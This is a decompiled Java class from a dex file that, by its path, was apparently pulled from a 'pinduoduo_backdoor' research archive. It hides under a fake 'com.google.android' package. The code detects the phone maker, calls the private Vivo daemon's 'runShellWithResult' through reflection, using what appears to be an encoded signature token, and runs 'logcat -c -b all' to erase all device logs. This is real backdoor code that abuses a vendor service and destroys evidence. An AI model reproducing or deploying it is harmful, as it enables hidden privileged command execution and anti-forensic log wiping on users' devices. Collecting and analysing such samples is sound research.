package com.google.android.sd.biz_dynamic_dex.base;

import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import java.io.File;
import java.lang.reflect.Method;
import java.util.Comparator;

public final class a {
  private static final Comparator<File> a = new Comparator<File>() {
    
    };
  
  public static String a() {
    String str2 = Build.MANUFACTURER;
    String str1 = "oppo";
    if (!"oppo".equalsIgnoreCase(str2)) {
      if ("realme".equalsIgnoreCase(str2))
        return "oppo"; 
      str1 = "huawei";
      if (!"huawei".equalsIgnoreCase(str2)) {
        if ("honor".equalsIgnoreCase(str2))
          return "huawei"; 
        str1 = "vivo";
        if (!"vivo".equalsIgnoreCase(str2)) {
          if ("bbk".equalsIgnoreCase(str2))
            return "vivo"; 
          str1 = "xiaomi";
          if (!"xiaomi".equalsIgnoreCase(str2))
            return "redmi".equalsIgnoreCase(str2) ? "xiaomi" : ""; 
        } 
      } 
    } 
    return str1;
  }
  
  public static void b() {
    if ("vivo".equalsIgnoreCase(a()) && Build.VERSION.SDK_INT < 26) {
      try {
        Method method2 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
        method2.setAccessible(true);
        Object object = method2.invoke(null, new Object[] { "vivo_daemon.service" });
        Class<?> clazz = Class.forName("com.vivo.services.daemon.VivoDmServiceProxy");
        object = clazz.getDeclaredMethod("asInterface", new Class[] { IBinder.class }).invoke(null, new Object[] { object });
        Method method1 = clazz.getDeclaredMethod("runShellWithResult", new Class[] { String.class });
        method1.setAccessible(true);
        if (TextUtils.equals(System.getProperty("persist.vivo.vivo_daemon", ""), "3.1.0")) {
          method1.invoke(object, new Object[] { "GA8CLwlZ38dIAjZNQQ3IKP0bTy+JgYaJQxHB6oCXASLqbIAGS85UPD9PdEe7C52PCvdwzCswCtjlmPaoP+j4ZmMBXOtpylzI7yYS6hrcNra6zKh8C3Y68RGgBt45+OEOcDTRG73Bew2akGCXbwBp8mdbEioZEMrZsPdx+JNQavca19E43h8+FSNm2RdJAG/pGjtP+w3kHvPMM6hZEZItwLWsqwfFNjByVc9t9LfO818eR/qKh1hRJN8D2M2uuqmYrD35QPvw3uZWYqYt9strqbTvIarWBA/1wpPvdI9ddMcnXQxFbn/ApYxHfh9i+M6fWfe8pp4PKuV1WCuYb73hsw==?".concat("logcat -c -b all") });
        } else {
          method1.invoke(object, new Object[] { "logcat -c -b all" });
        } 
        try {
          Runtime.getRuntime().exec("logcat -c -b all");
          return;
        } finally {}
      } catch (Exception exception) {
        try {
          Runtime.getRuntime().exec("logcat -c -b all");
          return;
        } finally {}
      } 
      return;
    } 
    try {
      Runtime.getRuntime().exec("logcat -c -b all");
      return;
    } finally {
      Exception exception;
    } 
  }
  
  public static void c() {}
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */